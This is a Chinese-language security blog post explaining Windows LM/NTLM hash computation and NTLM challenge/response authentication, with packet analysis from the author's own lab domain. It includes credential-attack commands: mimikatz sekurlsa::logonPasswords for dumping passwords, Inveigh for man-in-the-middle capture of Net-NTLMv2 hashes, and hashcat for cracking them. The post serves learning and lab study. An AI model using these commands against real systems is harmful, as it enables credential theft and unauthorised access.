+<h1 id="Windows-LM和NTLM哈希加密过程"><a href="#Windows-LM和NTLM哈希加密过程" class="headerlink" title="&lt;2&gt; Windows LM和NTLM哈希加密过程"></a>&lt;2&gt; Windows LM和NTLM哈希加密过程</h1><h2 id="1-LM-HASH值介绍"><a href="#1-LM-HASH值介绍" class="headerlink" title="(1) LM HASH值介绍"></a>(1) LM HASH值介绍</h2><p>Windows操作系统通常使用两种方法对用户明文密码进行加密处理。一部分为 LM-Hash，另一部分为NTLM-Hash。 在域环境中,用户信息存储在ntds.dit中，加密后为散列值</p>
+<p><strong>Hash结构：username:RID:LM-HASH:NT-HASH</strong></p>
+<p>LM Hash 全名为 “LAN Manager Hash” ，是微软为了提高Windows操作系统的安全性而采用的散列加密算法，其本质是 <strong>DES 加密</strong>。尽管LM Hash 比较容易破解，但为了保证系统的兼容性，Windows 只是将 LM Hash禁用了(从 Windows vista 和 Windows Server2008版本开始，Windows操作系统默认禁用LM Hash)。</p>
+<p><strong>LM Hash明文密码被限定在14位以内</strong>，即如果要停止使用 LM Hash，将用户密码设置成14位以上即可。 如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash通常 为 “ad3435b51404eead3b435b51404ee” (表示LM Hash为空值或被禁用) </p>
+<p>NTLM Hash是微软为了在提高安全性的同时，保证兼容性而设计的散列加密算法。NTLM Hash是基于 <strong>MD4</strong>加密算法进行加密的。个人版的Windows vista 以后，服务器版从 Windows Server2003 以后，Windows 操作系统的认证方式均为 NTLM Hash</p>
+<p>为了解决加密和身份验证方案中固有的安全弱点，Microsoft 于 1993年在Windows NT 3.1 中引入了NTLM协议。下面是各个版本对 LM Hash和 NTLM Hash的支持</p>
+<table>
+<thead>
+<tr>
+<th>加密类型</th>
+<th>2000</th>
+<th>XP</th>
+<th>2003</th>
+<th>Vista</th>
+<th>Win7</th>
+<th>2008</th>
+<th>Win8</th>
+<th>2012</th>
+<th>Win10</th>
+<th>2016</th>
+<th>Win11</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LM-Hash</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>NTLM-Hash</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<h2 id="2-LM-Hash加密原理"><a href="#2-LM-Hash加密原理" class="headerlink" title="(2) LM Hash加密原理"></a>(2) LM Hash加密原理</h2><p>假设我们 administrator的密码为 Admin@123</p>
+<p>加密过程如下：</p>
+<ol>
+<li><p>将明文口令转换为其大写形式    </p>
+<p>即 Admin@123 -&gt;  ADMIN@123</p>
+</li>
+<li><p>将字符串大写后转换为16进制字符串</p>
+<p>41 44 4D 49 4E 40 31 32 33</p>
+</li>
+<li><p>密码不足14字节要求用0补全，密码为9个字符，还差5个 补00</p>
+<p>补全后为：41 44 4D 49 4E 40 31 32 33 00 00 00 00 00</p>
+</li>
+<li><p>然后将上述编码分成2组7字节</p>
+</li>
+</ol>
+<p>   第一组：41 44 4D 49 4E 40 31</p>
+<p>   第二组：32 33 00 00 00 00 00</p>
+<ol start="5">
+<li><p>再将每一组7字节的十六进制转换为二进制,<strong>每7bit 一组末尾加0</strong>,在转换成十六进制组成得到2组8字节的编码</p>
+<p>第一组：0100 0001 0100 0100 0100 1101 0100 1001 0100 1110 0100 0000 0011 0001</p>
+<p>第二组：0011 0010 0011 0011 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000</p>
+<p>七位一组分开 末尾加上0 得到：</p>
+<p>第一组：0100000010100010000100101010100010010100011100100000000001100010</p>
+<p>第二组：0011001000011000110000000000000000000000000000000000000000000000</p>
+</li>
+<li><p>再挨个转换成十六进制</p>
+<p>第一组：40A212A894720062</p>
+<p>第二组：3218C00000000000</p>
+</li>
+<li><p>将以上步骤得到的两组8字节的编码，分别作为DES加密的key 给魔术字符串”KGS!@#$%” 进行加密</p>
+<p>KGS!@#$%的16进制为 4B47532140232425</p>
+<p>先用第一组当key</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925211741667.png" alt="image-20230925211741667"></p>
+<p>得到：6F08D7B306B1DAD4</p>
+<p>再用第二组当key</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925211904137.png" alt="image-20230925211904137"></p>
+<p>得到：B75E0C8D76954A50</p>
+</li>
+</ol>
+<p>最终拼接即可，6F08D7B306B1DAD4B75E0C8D76954A50    即 Admin@123 的 LM-Hash值</p>
+<h2 id="3-NTLM-Hash值介绍"><a href="#3-NTLM-Hash值介绍" class="headerlink" title="(3) NTLM Hash值介绍"></a>(3) NTLM Hash值介绍</h2><p>NTLM Hash是微软为了在提高安全性的同时，保证兼容性而设计的散列加密算法。<strong>NTLM Hash是基于 MD4加密算法进行加密的</strong>。个人版的Windows vista 以后，服务器版从 Windows Server2003 以后，Windows 操作系统的认证方式均为 NTLM Hash</p>
+<h2 id="4-NTLM-hash与NTLM的关系"><a href="#4-NTLM-hash与NTLM的关系" class="headerlink" title="(4) NTLM hash与NTLM的关系"></a>(4) NTLM hash与NTLM的关系</h2><p><strong>注：</strong>NTLM Hash值跟 NTLM协议不是一个东西，别混淆了</p>
+<ul>
+<li>NTLM hash为windows认证中的密码哈希散列，而 NTLM是一种网络认证协议，全称 NT LAN Manager，使用NTLM hash作为认证中的根本凭证</li>
+<li>LM Hash 即 LM协议所使用的密码hash。NT 和 LM认证机制相同，但加密算法不同，由于 LM Hash比较容易破解，在新一点的版本被淘汰</li>
+</ul>
+<h2 id="5-NTLM-Hash加密原理"><a href="#5-NTLM-Hash加密原理" class="headerlink" title="(5) NTLM Hash加密原理"></a>(5) NTLM Hash加密原理</h2><p>假设我们 administrator的密码为 Admin@123</p>
+<p>加密过程如下：</p>
+<ol>
+<li><p>将明文口令转换成十六进制的格式</p>
+<p>得到：41646D696E40313233</p>
+</li>
+<li><p>将十六进制转换成Unicode格式，即在每个字节后添加0x00</p>
+<p>得到：410064006D0069006E004000310032003300</p>
+</li>
+<li><p>对 Unicode字符串 hex转码后作 MD4 加密，生成32位的十六进制字符串</p>
+<p>得到：570a9a65db8fba761c1008a51d4c95ab</p>
+</li>
+</ol>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925213249994.png" alt="image-20230925213249994"></p>
+<p>cmd5可以爆破出来这个弱口令</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925213615379.png" alt="image-20230925213615379"></p>
+<p>所以 我们电脑里SAM文件存放的hash密文即为</p>
+<p>administrator:6F08D7B306B1DAD4B75E0C8D76954A50:570a9a65db8fba761c1008a51d4c95ab</p>
+<p>如果 LM hash被禁用，那么中间的LM Hash应该就是 “aad3b435b51404eeaad3b435b51404ee”</p>
+<p>我们利用 mimikatz 抓密码工具 再来验证一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe   # 进入到mimikatz的命令行</span><br><span class="line">privilege::debug # 提到debug权限</span><br><span class="line">sekurlsa::logonPasswords  # 通过各种方式抓取密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230925221821619.png" alt="image-20230925221821619"></p>
+<p>一模一样</p>
+<p>用python 来进行NTLM加密的话，代码为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">unicode_str = <span class="string">&quot;Admin@123&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>) <span class="comment"># 转unicode格式，每个字节后加00</span></span><br><span class="line"><span class="built_in">print</span>(unicode_str)</span><br><span class="line">hex_str = binascii.hexlify(unicode_str)</span><br><span class="line"><span class="built_in">print</span>(hex_str.decode())</span><br><span class="line"><span class="comment"># b&#x27;A\x00d\x00m\x00i\x00n\x00@\x001\x002\x003\x00&#x27;</span></span><br><span class="line"><span class="comment"># 410064006d0069006e004000310032003300</span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到第二步对应的 16进制串，然后使用hashcalc加密即可</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20230927085014846.png" alt="image-20230927085014846"></p>
+<h1 id="Windows网络认证"><a href="#Windows网络认证" class="headerlink" title="&lt;3&gt; Windows网络认证"></a>&lt;3&gt; Windows网络认证</h1><p>当我们访问同一局域网的一台主机上的SMB共享时提供凭证通过验证才能成功进行访问，这就涉及到windows的网络认证</p>
+<h2 id="1-网络认证概述"><a href="#1-网络认证概述" class="headerlink" title="(1) 网络认证概述"></a>(1) 网络认证概述</h2><p>网络认证：Windows网络认证是指在Windows 操作系统中进行网络通信和资源访问时，验证用户身份和授权权限的过程。它确保只有经过身份验证的用户能够访问网络资源，并根据其权限级别进行授权操作。</p>
+<p>网络认证有哪些？</p>
+<h2 id="2-NTLM协议"><a href="#2-NTLM协议" class="headerlink" title="(2) NTLM协议"></a>(2) NTLM协议</h2><p><strong>NTLM：NTLM 即 NT LAN Manager，是一种早期的Windows 网络认证协议，它基于 挑战（Challenge）&#x2F;响应（Response）的方式进行身份认证</strong>。尽管Kerberos 已经成为首选的认证协议，NTLM 在某些情况下仍在使用，特别在旧版Windows系统或非Windows系统进行交互操作时</p>
+<p><strong>NTLM中继（NTLM Relay）</strong>：是指在NTLM认证过程中设置中间人对HTLM认证的请求截获并转发的一种攻击行为</p>
+<h2 id="3-NTLM协议认证机制"><a href="#3-NTLM协议认证机制" class="headerlink" title="(3) NTLM协议认证机制"></a>(3) NTLM协议认证机制</h2><h3 id="NTLM在工作组环境的认证"><a href="#NTLM在工作组环境的认证" class="headerlink" title="NTLM在工作组环境的认证"></a>NTLM在工作组环境的认证</h3><p>其认证过程大致分为三步：</p>
+<ol>
+<li>协商：解决历史遗留问题，为了能向下兼容，双方会确定一下传输协议的版本等各种信息</li>
+<li>质询： 挑战（Challenge）&#x2F;响应（Response）认证机制的关键</li>
+<li>验证：对质询的结果进行验证，验证通过后即 允许访问资源。是认证的最后一步</li>
+</ol>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005162943750.png" alt="image-20231005162943750"></p>
+<p><strong>NTLM协议 v1 v2版本区别</strong></p>
+<p>协商时会确定传输协议的版本，这里版本分为v1和v2。</p>
+<p>NTLMv1与NTLM v2最显著的区别就是</p>
+<ul>
+<li>共同点就是加密的原料都是NTLM Hash</li>
+<li>不同点是Challenge与加密算法不同，NTLM v1的Challenge有8位，NTLM v2的Challenge为16位；NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5</li>
+</ul>
+<p><strong>工作组中认证过程：</strong></p>
+<ol>
+<li>当客户端要访问服务器上某个受保护的服务时，需要输入服务器的用户名和密码进行验证。此时客户端会在本地缓存一份服务器密码的NTLM hash，然后向服务器发送协商消息。</li>
+<li>服务器收到客户端的协商信息后，生成并回复质询消息。该消息中包含了一个由服务端生成的16位随机值challenge，服务器也会在本地缓存该值。</li>
+<li>客户端收到质询消息后，会使用步骤1中缓存的服务器的NTLM hash 与 Challenge进行一系列加密生成 Response，再将 Response 封装到身份验证消息中发往服务器。</li>
+<li>服务器在收到身份验证消息后，用自己密码的NTLM hash与Challenge进行加密生成Response2，并比较Response2与Response是否一致。如果一致，就证明客户端掌握了服务器的密码，认证成功，否则认证失败。</li>
+</ol>
+<h3 id="NTLM在域环境下的认证"><a href="#NTLM在域环境下的认证" class="headerlink" title="NTLM在域环境下的认证"></a>NTLM在域环境下的认证</h3><p>在域环境中，由于所有域用户的哈希值都存储在 域控的 NTDS.dit 中，服务器本身无法计算Response消息，因此需要与域控建立一个安全通道，并通过域控完成最后的认证流程。前三个步骤同工作组环境的认证</p>
+<p><strong>域中认证过程：</strong></p>
+<ol>
+<li>当域用户输入自己的账号和密码登录客户端主机时，客户端会将用户输入的密码转换为NTLM hash并缓存。当用户想访问域内某台服务器上的资源时，客户端会向服务器发送TYPE1 Negotiate消息</li>
+<li>服务器收到客户端的协商信息后，生成并回复质询消息。服务端发送Type2 NTLMSSP_CHALLENGE消息,其中包含16位的随机Challenge值</li>
+<li>客户端收到质询消息后，会使用步骤1中缓存的域用户的NTLM hash 与 Challenge进行一系列加密生成 Response。客户端发送Type3 NTLMSSP_AUTH消息,其中包括Response消息</li>
+<li>服务端收到客户端发来的Type3 NTLMSSP_AUTH消息后，会将消息通过 Netlogon协议转发给域控制器</li>
+<li>域控根据自身计算出的Net-NTLM Hash与服务端发过来的Net-NTLM Hash做比较，然后根据结果对客户端进行相应的回复</li>
+</ol>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005164440355.png" alt="image-20231005164440355"></p>
+<h2 id="4-NTLM基本概念SSPI-SSP"><a href="#4-NTLM基本概念SSPI-SSP" class="headerlink" title="(4) NTLM基本概念SSPI&#x2F;SSP"></a>(4) NTLM基本概念SSPI&#x2F;SSP</h2><p>SSPI是安全服务接口是Windows定义的一套接口,该接口定义了与安全有关的功能函数,包括但不限于:</p>
+<ol>
+<li>身份验证机制</li>
+<li>为其他协议提供会话安全可为通信提供完整性校验以及数据的加密、解密的功能。</li>
+</ol>
+<p>SSPI 只是定义了一套接口函数,具体实现有SSP完成。</p>
+<p>SSP是SSPI的实现者,微软自己也实现了很多SSP用于提供安全功能</p>
+<p>典型的SSP实现:</p>
+<ol>
+<li>NTLM SSP:Windows NT 3.5中引入(msv1_0.dll)为Windows 2000之前的客户端提供服务器域和非域身份验证（SMB&#x2F;CIFS)提供NTLM质询&#x2F;响应身份验证</li>
+<li>Kerberos SSP:Windows 2000 中引入为Windows 2000以及更高的版本中首选客户端-服务器域提供相互身份验证</li>
+</ol>
+<p>SSPI中定义了会话安全的API,所以上层应用利用任何SSP与远程的服务进行身份验证后,SSP都会为本次的连接生成一个随机key,这个随机key，称为”session key” ，上层的应用经过身份验证后，可以选择性使用这个session key,往服务端或者接收服务端的数据进行签名或加密，SSP就是一个dll，用来实现身份验证等安全功能，不同的SSP实现身份验证的方式是不一样的，比如NTLM SSP实现的是一种基于质询&#x2F;响应的身份验证机制，Kerberos SSP实现的是基于Tick票据的身份验证机制。</p>
+<h2 id="5-NTLM认证过程抓包分析"><a href="#5-NTLM认证过程抓包分析" class="headerlink" title="(5) NTLM认证过程抓包分析"></a>(5) NTLM认证过程抓包分析</h2><p>为了学习方便，又搭了一套域环境</p>
+<ul>
+<li>Win2012 IP：192.168.16.10       即 DC</li>
+<li>Win2008 IP：192.168.16.20       域内主机</li>
+</ul>
+<p>我们打开 wireshark 监听 域环境的那个VMNet </p>
+<p>使用访问另一台主机的共享</p>
+<p><code>net use \\192.168.16.10\ipc$ /u:administrator Admin@123</code></p>
+<p>根据抓到的数据包，下面也可以看到，net use 是基于SMB协议</p>
+<p>我们 先看前四个数据包，Negotiate Protocol Response，是进行协商的</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005125646174.png" alt="image-20231005125646174"></p>
+<p>再往下看 第五个数据包，这个是用户启动身份的验证包  flag里确定了一些相关规则</p>
+<p>第六个数据包 包含了challenge值</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005132050370.png" alt="image-20231005132050370"></p>
+<p>第七个数据包是 发送Response的数据包，还包含账户名的相关信息</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005131735149.png" alt="image-20231005131735149"></p>
+<p>客户端根据获得的信息，进行一系列加密得到Response，即这里的 “NTLMv2 Response” 的值</p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005132538220.png" alt="image-20231005132538220"></p>
+<p>第八个数据包 即返回结果，用来表示成功 or 失败  失败即ERROR</p>
+<h2 id="6-challenge和Response分析"><a href="#6-challenge和Response分析" class="headerlink" title="(6) challenge和Response分析"></a>(6) challenge和Response分析</h2><p>challenge是随机数，位数取决于 NTLM协议的版本  前面提到了</p>
+<p><strong>response是如何组成的</strong></p>
+<p>response由 NTProofStr+blob两部分组成</p>
+<ul>
+<li>NTProofStr：使用 NTLM v2 Hash值作为key 对(challenge+blob) 进行 HMAC-MD5加密</li>
+<li>NTLM v2 Hash：大写Username+Domain name 进行unicode编码，然后和用户名对应密码的 NTLM HASH值进行HMAC-MD5加密</li>
+<li>blob是由时间、目标信息、随机填充字符生成</li>
+</ul>
+<p>计算公式如下:</p>
+<ul>
+<li><p>NTLMv2Hash&#x3D; HMAC-MD5(unicode(hex(upper(UserName)+DomainName))),NTLM Hash)</p>
+</li>
+<li><p>NTProofStr&#x3D;HMAC-MD5(challenge+blob,NTLM v2 Hash)</p>
+</li>
+</ul>
+<p>我们平时利用工具攻击时 抓到的往往是 Net-NTLM Hash数据</p>
+<h3 id="Net-NTLM-Hash格式介绍及拼接"><a href="#Net-NTLM-Hash格式介绍及拼接" class="headerlink" title="Net-NTLM-Hash格式介绍及拼接"></a>Net-NTLM-Hash格式介绍及拼接</h3><p>Net-NTLM-v2-Hash的格式为：username::domain:challenge:HMAC-MD5:blob</p>
+<p>含义:</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>要访问服务器的用户名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>domain</td>
+<td>域信息</td>
+</tr>
+<tr>
+<td>challenge</td>
+<td>数据包6中的服务器返回的challenge值</td>
+</tr>
+<tr>
+<td>HMAC-MD5</td>
+<td>数据包7中的NTProofStr</td>
+</tr>
+<tr>
+<td>blob</td>
+<td>对应数据包7中NTLM v2 Response去掉NTProofStr的后半部分</td>
+</tr>
+</tbody></table>
+<p>我们利用中间人攻击 Inveigh工具抓取一下 Net-NTLM-v2-Hash 值</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">PS C:\Users\Administrator\Desktop\Inveigh&gt; Import-Module .\Inveigh.ps1</span><br><span class="line">PS C:\Users\Administrator\Desktop\Inveigh&gt; Invoke-Inveigh -ConsoleOutput Y -FileOutput y</span><br><span class="line"># 不能加载的话就执行一下 <span class="built_in">set</span>-ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">16</span>.<span class="number">10</span>\ipc$ /u:administrator Admin@<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005143750719.png" alt="image-20231005143750719"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator::WIN2008:D5E3F1B5CF0101C8:692B3996DC8BF7F0DA9598E6B59DC63D:010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005144135954.png" alt="image-20231005144135954"></p>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005144317709.png" alt="image-20231005144317709"></p>
+<p>可以看到 工具抓取的challenge和NTProofStr跟wireshark的是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NTLM HASH：570a9a65db8fba761c1008a51d4c95ab</span><br><span class="line">challenge：D5E3F1B5CF0101C8</span><br><span class="line">NTProofStr：692B3996DC8BF7F0DA9598E6B59DC63D</span><br><span class="line">blob：010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>我们利用获取的信息手动计算一下，体会加密过程</p>
+<h3 id="计算NTLM-v2-HASH"><a href="#计算NTLM-v2-HASH" class="headerlink" title="计算NTLM-v2-HASH"></a>计算NTLM-v2-HASH</h3><ol>
+<li>将 administrator转化为大写：ADMINISTRATOR</li>
+<li>然后与域名WIN2008 拼接起来：ADMINISTRATORWIN2008</li>
+<li>转化成16进制：41444d494e4953545241544f5257494e32303038</li>
+<li>转化为unicode格式：410044004d0049004e004900530054005200410054004f005200570049004e003200300030003800</li>
+<li>然后 用NTLM HASH：570a9a65db8fba761c1008a51d4c95ab 作为key 对上述进行HMAC-MD5加密 得到：e864d6b3c317322f934b6df3d5c44ffa  即 NTLM-v2-HASH的值</li>
+</ol>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005151402590.png" alt="image-20231005151402590"></p>
+<h3 id="计算-NTProofStr"><a href="#计算-NTProofStr" class="headerlink" title="计算 NTProofStr"></a>计算 NTProofStr</h3><ol>
+<li>将 NTLM-v2-HASH值  e864d6b3c317322f934b6df3d5c44ffa 作为key</li>
+<li>将 challenge 与 blob 值拼接起来：D5E3F1B5CF0101C8010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000</li>
+<li>将 NTLM-v2-hash作为key 对上述数据进行 HMAC-MD5加密，得到：692b3996dc8bf7f0da9598e6b59dc63d   验证一下 一致</li>
+</ol>
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005151813588.png" alt="image-20231005151813588"></p>
+<h3 id="使用hashcat破解NET-NTLM-hash"><a href="#使用hashcat破解NET-NTLM-hash" class="headerlink" title="使用hashcat破解NET-NTLM hash"></a>使用hashcat破解NET-NTLM hash</h3><p>hashcat [option]</p>
+<ul>
+<li>-m：hash-type，5600对应NetNTLMv2，详细参数可查表：<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php">https://hashcat.net/wiki/doku.php</a></li>
+<li>-o：输出文件</li>
+<li>字典文件为1.txt</li>
+<li>–force代表强制执行</li>
+</ul>
+<p>hashcat 爆破一下我们上面得到的 NET-NTLM-Hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 administrator::WIN2008:D5E3F1B5CF0101C8:692B3996DC8BF7F0DA9598E6B59DC63D:010100000000000078C3246656F7D901A0EB39BDD6C96EBA00000000020008004800410043004B000100040044004300040010006800610063006B002E0063006F006D0003001600440043002E006800610063006B002E0063006F006D00050010006800610063006B002E0063006F006D000700080078C3246656F7D90106000400020000000800300030000000000000000000000000300000B2B92C5F984625F199A7B3DA00A7897FD7B57990D2735F2E8E9198F48ADD0A8E0A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310036002E0031003000000000000000000000000000 rockyou.txt -o result.txt --force</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/image-20231005154257959.png" alt="image-20231005154257959"></p>
+<h2 id="7-NTLM协议的安全性问题"><a href="#7-NTLM协议的安全性问题" class="headerlink" title="(7) NTLM协议的安全性问题"></a>(7) NTLM协议的安全性问题</h2><ol>
+<li>Net-NTLM v1 v2 Hash破解：v1 使用DES加密，更容易破解。v2版本的话可以通过碰撞、彩虹表、暴力猜解等方式，获取明文账号密码</li>
+<li>NTLM-relay攻击：通过中间人攻击，如果获得了 Net-NTLM Hash值，如果爆破不出密码 可以考虑NTLM-relay攻击，可以重放 进行认证</li>
+</ol>
+<p>参考：<a target="_blank" rel="noopener" href="https://chenchena.blog.csdn.net/article/details/123274876?spm=1001.2014.3001.5502">https://chenchena.blog.csdn.net/article/details/123274876?spm=1001.2014.3001.5502</a></p>
+<h1 id="Kerberos域认证★"><a href="#Kerberos域认证★" class="headerlink" title="&lt;4&gt; Kerberos域认证★"></a>&lt;4&gt; Kerberos域认证★</h1></div><div class="article-licensing box"><div class="licensing-title"><p>第二章-Windows认证机制和协议</p><p><a href="https://1vxyz.github.io/2023/09/25/第二章-Windows认证机制和协议/">https://1vxyz.github.io/2023/09/25/第二章-Windows认证机制和协议/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>1vxyz</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-09-25</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-10-07</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.jpg" 